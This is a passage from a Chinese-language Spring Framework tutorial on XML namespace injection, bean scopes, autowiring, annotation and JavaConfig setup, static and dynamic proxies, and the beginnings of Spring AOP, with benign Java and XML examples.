\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2 .6.3 拓展方式注入 p命名和c命名注入 P命名空间注入 : 需要在头文件中加入约束文件 xml\r1 2 3 4 导入约束 : xmlns:p=\u0026#34;http://www.springframework.org/schema/p\u0026#34; \u0026lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--\u0026gt; \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34; p:name=\u0026#34;qwer\u0026#34; p:age=\u0026#34;12\u0026#34;/\u0026gt; 需要导入 junit 包\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; c 命名空间注入 : 需要在头文件中加入约束文件，同时加上有参构造器 xml\r1 2 3 导入约束 : xmlns:c=\u0026#34;http://www.springframework.org/schema/c\u0026#34; \u0026lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--\u0026gt; \u0026lt;bean id=\u0026#34;user2\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34; c:name=\u0026#34;qaz\u0026#34; c:age=\u0026#34;18\u0026#34;/\u0026gt; 有参和无参构造器\njava\r1 2 3 4 5 6 7 public User() { } public User(String name, int age) { this.name = name; this.age = age; } 2.7 Bean 作用域 几种作用域中，request、session作用域仅在基于web的应用中使用（不必关心你所采用的是什么web应用框架），只能用在基于web的Spring ApplicationContext环境。\nThe Singleton Scope （单例模式） 在Spring loC容器中仅存在一个Bean实例，Bean以单例方式存在，默认值\n当一个bean的作用域为Singleton，那么Spring IoC容器中只会存在一个共享的bean实例，并且所有对bean的请求，只要id与该bean定义相匹配，则只会返回bean的同一实例。Singleton是单例类型，就是在创建起容器时就同时自动创建了一个bean的对象，不管你是否使用，他都存在了，每次获取到的对象都是同一个对象。注意，Singleton作用域是Spring中的缺省作用域。要在XML中将bean定义成singleton，可以这样配置：\nxml\r1 \u0026lt;bean id=\u0026#34;user2\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34; c:age=\u0026#34;12\u0026#34; c:name=\u0026#34;qwe\u0026#34; scope=\u0026#34;singleton\u0026#34;/\u0026gt; The Prototype Scope（原型模式） 每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean()\n当一个bean的作用域为Prototype，表示一个bean定义对应多个对象实例。Prototype作用域的bean会导致在每次对该bean请求（将其注入到另一个bean中，或者以程序的方式调用容器的getBean()方法）时都会创建一个新的bean实例。Prototype是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。根据经验，对有状态的bean应该使用prototype作用域，而对无状态的bean则应该使用singleton作用域。在XML中将bean定义成prototype，可以这样配置：\nxml\r1 \u0026lt;bean id=\u0026#34;accountService\u0026#34; class=\u0026#34;com.something.DefaultAccountService\u0026#34; scope=\u0026#34;prototype\u0026#34;/\u0026gt; request、session、application 这些只能在 web 开发中使用到 2.8 Bean 的自动装配 自动装配是使用spring满足bean依赖的一种方法 spring会在应用上下文中为某个bean寻找其依赖的bean。 Spring中bean有三种装配方式：\n在xml中显式配置； 在java中显式配置； 隐式的bean发现机制和自动装配。 Spring的自动装配的两个操作：\n组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean； 自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC/DI； 组件扫描和自动装配组合发挥巨大威力，使得显示的配置降低到最少。\n推荐不使用自动装配xml配置 , 而使用注解\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package com.kuang.pojo; public class Cat { public void shout() { System.out.println(\u0026#34;miao~\u0026#34;); } } package com.kuang.pojo; public class Dog { public void shout() { System.out.println(\u0026#34;wang~\u0026#34;); } } package com.kuang.pojo; public class People { private Cat cat; private Dog dog; private String name; public Cat getCat() { return cat; } public void setCat(Cat cat) { this.cat = cat; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Dog getDog() { return dog; } public void setDog(Dog dog) { this.dog = dog; } @Override public String toString() { return \u0026#34;People{\u0026#34; + \u0026#34;cat=\u0026#34; + cat + \u0026#34;, dog=\u0026#34; + dog + \u0026#34;, name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;cat\u0026#34; class=\u0026#34;com.kuang.pojo.Cat\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;dog\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;people\u0026#34; class=\u0026#34;com.kuang.pojo.People\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;was\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;dog\u0026#34; ref=\u0026#34;dog\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;cat\u0026#34; ref=\u0026#34;cat\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; import com.kuang.pojo.People; import org.junit.Test; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { @Test public void test1() { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); People people = context.getBean(\u0026#34;people\u0026#34;, People.class); people.getCat().shout(); people.getDog().shout(); } } 2.8.1 byName 自动装配 xml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;cat\u0026#34; class=\u0026#34;com.kuang.pojo.Cat\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;dog\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; \u0026lt;!--byName : 会自动在容器上下文中查找，和自己对象 set 方法后面的值对应的 beanid--\u0026gt; \u0026lt;bean id=\u0026#34;people\u0026#34; class=\u0026#34;com.kuang.pojo.People\u0026#34; autowire=\u0026#34;byName\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;was\u0026#34;/\u0026gt; \u0026lt;!-- \u0026lt;property name=\u0026#34;dog\u0026#34; ref=\u0026#34;dog\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;property name=\u0026#34;cat\u0026#34; ref=\u0026#34;cat\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; byName 强调对象 set 方法对应的beanid唯一\n2.8.2 byType 自动装配 xml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;cat\u0026#34; class=\u0026#34;com.kuang.pojo.Cat\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;dog222\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; \u0026lt;!--byName : 会自动在容器上下文中查找，和自己对象 set 方法后面的值对应的 beanid--\u0026gt; \u0026lt;!-- \u0026lt;bean id=\u0026#34;people\u0026#34; class=\u0026#34;com.kuang.pojo.People\u0026#34; autowire=\u0026#34;byName\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!--byName : 会自动在容器上下文中查找，和自己对象属性类型相同的 bean--\u0026gt; \u0026lt;bean id=\u0026#34;people\u0026#34; class=\u0026#34;com.kuang.pojo.People\u0026#34; autowire=\u0026#34;byType\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;was\u0026#34;/\u0026gt; \u0026lt;!-- \u0026lt;property name=\u0026#34;dog\u0026#34; ref=\u0026#34;dog\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;property name=\u0026#34;cat\u0026#34; ref=\u0026#34;cat\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; byType 只允许有一个对象属性，例如：\nxml\r1 2 \u0026lt;bean id=\u0026#34;dog222\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;dog22\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; 当有多个对象类型时，会直接报错\n小结： byName\n需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性的set方法的值一致 当一个bean节点带有 autowire byName的属性时 将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat 去spring容器中寻找是否有此字符串名称id的对象 如果有，就取出注入；如果没有，就报空指针异常 byType\n需要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致 如果不一致，会报异常：NoUniqueBeanDefinitionException 2.8.3 使用注解实现自动装配 jdk 1.5支持注解，Spring 2.5 支持注解\n使用注解须知：\n导入约束：context 配置注解的支持：context:annotation-config xml\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;context:annotation-config/\u0026gt; \u0026lt;/beans\u0026gt; @Autowired 属性上使用 set方式上使用 使用Autowired我们可以不用编写Set方法了，前提是你这个自动装配的属性在IOC（Spring）容器中存在，且符合名字 @Autowired(required=false) 说明：false，对象可以为null；true，对象必须存对象，不能为null。\n//如果允许对象为null，设置required = false,默认为true\n@Autowired(required = false)\nprivate Cat cat;\n测试：\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;context:annotation-config/\u0026gt; \u0026lt;bean id=\u0026#34;cat\u0026#34; class=\u0026#34;com.kuang.pojo.Cat\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;dog\u0026#34; class=\u0026#34;com.kuang.pojo.Dog\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;people\u0026#34; class=\u0026#34;com.kuang.pojo.People\u0026#34;/\u0026gt; \u0026lt;/beans package com.kuang.pojo; import org.springframework.beans.factory.annotation.Autowired; public class People { @Autowired private Cat cat; @Autowired private Dog dog; private String name; public Cat getCat() { return cat; } public void setCat(Cat cat) { this.cat = cat; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Dog getDog() { return dog; } public void setDog(Dog dog) { this.dog = dog; } @Override public String toString() { return \u0026#34;People{\u0026#34; + \u0026#34;cat=\u0026#34; + cat + \u0026#34;, dog=\u0026#34; + dog + \u0026#34;, name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } @Qualifier 当存在多个类型的Bean时，加入@Qualifier 可以根据byName的方式自动装配 @Qualifier不能单独使用 @Resource @Resource如有指定的name属性，先按该属性进行byName方式查找装配； 其次再进行默认的byName方式进行装配； 如果以上都不成功，则按byType的方式自动装配。 都不成功，则报异常。 2.9 使用注解开发 在spring4之后，想要使用注解形式，必须得要引入aop的包\n使用注解须知：\n导入约束：context 配置注解的支持：context:annotation-config xml\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;context:annotation-config/\u0026gt; \u0026lt;/beans\u0026gt; 2.9.1 Bean 实现 @Component\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;!--指定要扫描的包，这个包下面的注解就会生效--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.kuang.pojo\u0026#34;/\u0026gt; \u0026lt;context:annotation-config/\u0026gt; \u0026lt;/beans\u0026gt; package com.kuang.pojo; import org.springframework.stereotype.Component; //等价于 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;/\u0026gt; @Component public class User { public String name = \u0026#34;qwer\u0026#34;; } import com.kuang.pojo.User; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;applicationContext.xml\u0026#34;); User user = (User) context.getBean(\u0026#34;user\u0026#34;); System.out.println(user.name); } } 2.9.2 属性注解 java\r1 2 @Value(\u0026#34;123\u0026#34;) public String name; 2.9.3 衍生注解 @Component三个衍生注解\n为了更好的进行分层，Spring可以使用其它三个注解，功能一样，都是将某个类注册到Spring中，装配Bean\n@Controller：web层 @Service：service层 @Repository：dao层 2.9.4 自动装配注解 @Autowired ：通过类型、名字自动装配\n@Qualifier ：如果 @Autowired 不能唯一自动装配上属性，则通过 @Qualifier(value=\u0026ldquo;xxx\u0026rdquo;)\n@Resource ： 通过名字、类型自动装配\n2.9.5 作用域 @scope\nsingleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。 prototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收 java\r1 2 3 4 5 6 7 8 9 10 11 12 //等价于 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;/\u0026gt; @Component @Scope(\u0026#34;singleton\u0026#34;) //@Scope(\u0026#34;prototype\u0026#34;) public class User { // 相当于配置文件中 \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;123\u0026#34;/\u0026gt; @Value(\u0026#34;123\u0026#34;) public String name; //public String name = \u0026#34;qwer\u0026#34;; } 2.9.6 小结 XML与注解比较\nXML可以适用任何场景 ，结构清晰，维护方便 注解不是自己提供的类使用不了，开发简单方便 xml与注解整合开发 ：推荐最佳实践\nxml管理Bean 注解完成属性注入 使用过程中， 必须让注解生效，就需要开启注解的支持 xml\r1 2 3 \u0026lt;!--指定要扫描的包，这个包下面的注解就会生效--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.kuang\u0026#34;/\u0026gt; \u0026lt;context:annotation-config/\u0026gt; 2.10 使用Java的方式进行配置 JavaConfig 是 Spring 的一个子项目，在 Spring4 之后，他成了一个核心\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 package com.kuang.pojo; import org.springframework.beans.factory.annotation.Value; import org.springframework.stereotype.Component; //@Component 说明这个类被 Spring 容器管理 @Component public class User { private String name; public String getName() { return name; } //属性注入值 @Value(\u0026#34;123\u0026#34;) public void setName(String name) { this.name = name; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } package com.kuang.config; import com.kuang.pojo.User; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.Import; //也会被 Spring 容器管理，因为它本来就是一个 @Component //@Configuration 代表这个类是一个配置类，和 xml 配置文件作用一样 @Configuration @ComponentScan(\u0026#34;com.kuang.pojo\u0026#34;) //导入合并其他配置类，类似于配置文件中的 inculde 标签 @Import(Config2.class) public class Config { //注册一个 Bean,相当于之前写的 bean 标签 //这个方法的名字，相当于 bean 标签的 id //这个方法的返回值，相当于 bean 标签的 class @Bean public User getUser() { //new User() 相当于之前写的 \u0026lt;bean class=\u0026#34;com.kuang.pojo.User\u0026#34;/\u0026gt; return new User(); } } package com.kuang.config; import org.springframework.context.annotation.Configuration; @Configuration public class Config2 { } import com.kuang.config.Config; import com.kuang.pojo.User; import org.springframework.context.ApplicationContext; import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class MyTest { public static void main(String[] args) { //如果完全使用了配置类方式去做，就只能通过 AnnotationConfigApplicationContext 来获取 Bean容器，通过配置类的 class 来获取 ApplicationContext context = new AnnotationConfigApplicationContext(Config.class); User getUser = (User) context.getBean(\u0026#34;getUser\u0026#34;); System.out.println(getUser.getName()); } } 3、代理模式 代理模式即 SpringAOP 的底层\n代理模式分为静态代理和动态代理\n原型：\n3.1 静态代理 角色分析：\n抽象角色 ： 一般会使用接口或者抽象类来解决 真实角色 ：被代理角色 代理角色 ：代理真实角色， 客户 ：访问代理对象的人 代理模式的好处：\n可以使真实角色的操作更加纯粹，不用关注一些公共的业务 公共也交给代理角色，实现了业务的分工 公共业务发生扩展的时候，方便集中管理 缺点：\n一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package com.kuang.demo01; //租房 public interface Rent { public void rent(); } package com.kuang.demo01; //房东 public class Host implements Rent{ @Override public void rent() { System.out.println(\u0026#34;房东要出租房子\u0026#34;); } } package com.kuang.demo01; public class Client { public static void main(String[] args) { //房东要租房子 Host host = new Host(); //代理，中介帮房东租房子，但是代理会有一些附属操作 Proxy proxy = new Proxy(host); //你不用面对房东，直接找中介租房子 proxy.rent(); } } package com.kuang.demo01; public class Proxy implements Rent{ private Host host; public Proxy() { } public Proxy(Host host) { this.host = host; } @Override public void rent() { host.rent(); seeHouse(); fare(); hetong(); } //看房 public void seeHouse() { System.out.println(\u0026#34;中介带你看房\u0026#34;); } //收中介费 public void fare() { System.out.println(\u0026#34;中介收取中介费\u0026#34;); } //签租赁合同 public void hetong() { System.out.println(\u0026#34;中介签租赁合同\u0026#34;); } } 另一例:\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 package com.kuang.demo02; public interface UserService { public void add(); public void delete(); public void update(); public void query(); } package com.kuang.demo02; //真实对象 public class UserServiceImpl implements UserService { @Override public void add() { System.out.println(\u0026#34;增加了一个用户\u0026#34;); } @Override public void delete() { System.out.println(\u0026#34;删除了一个用户\u0026#34;); } @Override public void update() { System.out.println(\u0026#34;修改了一个用户\u0026#34;); } @Override public void query() { System.out.println(\u0026#34;查询了一个用户\u0026#34;); } } package com.kuang.demo02; public class UserServiceProxy implements UserService { private UserServiceImpl userService; public void setUserService(UserServiceImpl userService) { this.userService = userService; } @Override public void add() { log(\u0026#34;add\u0026#34;); userService.add(); } @Override public void delete() { log(\u0026#34;delete\u0026#34;); userService.delete(); } @Override public void update() { log(\u0026#34;update\u0026#34;); userService.update(); } @Override public void query() { log(\u0026#34;query\u0026#34;); userService.query(); } //日志方法 public void log(String msg) { System.out.println(\u0026#34;[Debug] 使用了\u0026#34;+msg+\u0026#34;方法\u0026#34;); } } package com.kuang.demo02; public class Client { public static void main(String[] args) { UserServiceImpl userService = new UserServiceImpl(); //代理类 UserServiceProxy proxy = new UserServiceProxy(); //使用代理类实现日志功能！ proxy.setUserService(userService); proxy.add(); } } 在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想\n3.2 动态代理 动态代理和静态代理角色一样\n动态代理的代理类是动态生成的，不是我们直接写好的\n动态代理分为俩大类：基于接口的动态代理，基于类的动态代理\n基于接口\u0026ndash;JDK 动态代理 基于类\u0026ndash;cglib java 字节码实现：javasist 了解俩个类：\nProxy：代理 InvocationHandler：调用处理程序 动态代理的好处\n静态代理有的它都有，静态代理没有的，它也有！\n可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 . 公共的业务由代理来完成 . 实现了业务的分工 , 公共业务发生扩展时变得更加集中和方便 . 一个动态代理 , 一般代理某一类业务 一个动态代理可以代理多个类，代理的是接口！ 案例一\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 package com.kuang.demo03; //房东 public class Host implements Rent { @Override public void rent() { System.out.println(\u0026#34;房东要出租房子\u0026#34;); } } package com.kuang.demo03; //租房 public interface Rent { public void rent(); } package com.kuang.demo03; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; //使用此类自动生成代理类 public class ProxyInvocationHangler implements InvocationHandler { //被代理的接口 private Rent rent; public void setRent(Rent rent) { this.rent = rent; } //生成得到代理类 public Object getProxy() { return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this); } //处理代理实例，并返回结果 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //动态代理的本质，就是使用反射机制实现 seeHouse(); Object result = method.invoke(rent, args); //return method.invoke(rent, args); fare(); return result; } public void seeHouse() { System.out.println(\u0026#34;中介带看房子\u0026#34;); } public void fare() { System.out.println(\u0026#34;收中介费\u0026#34;); } } package com.kuang.demo03; public class Client { public static void main(String[] args) { //真实角色 Host host = new Host(); //代理角色，现在没有 ProxyInvocationHangler pih = new ProxyInvocationHangler(); //通过调用程序处理角色来处理我们要调用的接口对象 pih.setRent(host); Rent proxy = (Rent) pih.getProxy(); proxy.rent(); } } 案例二：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.kuang.demo04; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; //使用此类自动生成代理类 public class ProxyInvocationHangler implements InvocationHandler { //被代理的接口 private Object target; public void setTarget(Object target) { this.target = target; } //生成得到代理类 public Object getProxy() { return Proxy.newProxyInstance(this.getClass().getClassLoader(), target.getClass().getInterfaces(), this); } //处理代理实例，并返回结果 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { log(method.getName()); //动态代理的本质，就是使用反射机制实现 return method.invoke(target, args); } public void log(String msg) { System.out.println(\u0026#34;执行了\u0026#34;+msg+\u0026#34;方法\u0026#34;); } } package com.kuang.demo04; import com.kuang.demo02.UserService; import com.kuang.demo02.UserServiceImpl; public class Client { public static void main(String[] args) { //真实角色 UserServiceImpl userService = new UserServiceImpl(); //代理角色，现在没有p ProxyInvocationHangler pih = new ProxyInvocationHangler(); //设置代理对象 pih.setTarget(userService); //动态生成代理类 UserService proxy = (UserService) pih.getProxy(); proxy.add(); // proxy.delete(); // proxy.update(); } } 4、AOP 4.1 AOP 简介 4.1.1 什么是 AOP AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\n4.1.2 Aop在Spring中的作用 提供声明式事务；允许用户自定义切面\n以下名词简单了解：\n横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 \u0026hellip;. 切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。 通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。 目标（Target）：被通知对象。 代理（Proxy）：向目标对象应用通知之后创建的对象。 切入点（PointCut）：切面通知 执行的 “地点”的定义。 连接点（JointPoint）：与切入点匹配的执行点。 SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice:\n即 Aop 在 不改变原有代码的情况下 , 去增加新的功能\n4.1.3 使用Spring实现Aop 【重点】使用AOP织入，需要导入一个依赖包！\nxml\r1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 首先编写我们的业务接口和实现类\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package com.kuang.service; public interface UserService { public void add(); public void delete(); public void update(); public void select(); } package com.kuang.service; public class UserServiceImpl implements UserService { @Override public void add() { System.out.println(\u0026#34;增加了一个用户\u0026#34;); } @Override public void delete() { System.out.println(\u0026#34;删除了一个用户\u0026#34;); } @Override public void update() { System.out.println(\u0026#34;更新了一个用户\u0026#34;); } @Override public void select() { System.out.println(\u0026#34;查询了一个用户\u0026#34;); } } 第一种方式： 通过 Spring API 实现 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package com.kuang.log; import org.springframework.aop.MethodBeforeAdvice; import java.lang.reflect.Method; public class Log implements MethodBeforeAdvice { //method: 要执行的目标对象的方法 //args: 参数 //target(o): 目标读写 @Override public void before(Method method, Object[] objects, Object o) throws Throwable { System.out.println(o.getClass().getName()+\u0026#34;的\u0026#34;+method.getName()+\u0026#34;被执行了\u0026#34;); } } package com.kuang.log; import org.springframework.aop.AfterReturningAdvice; import 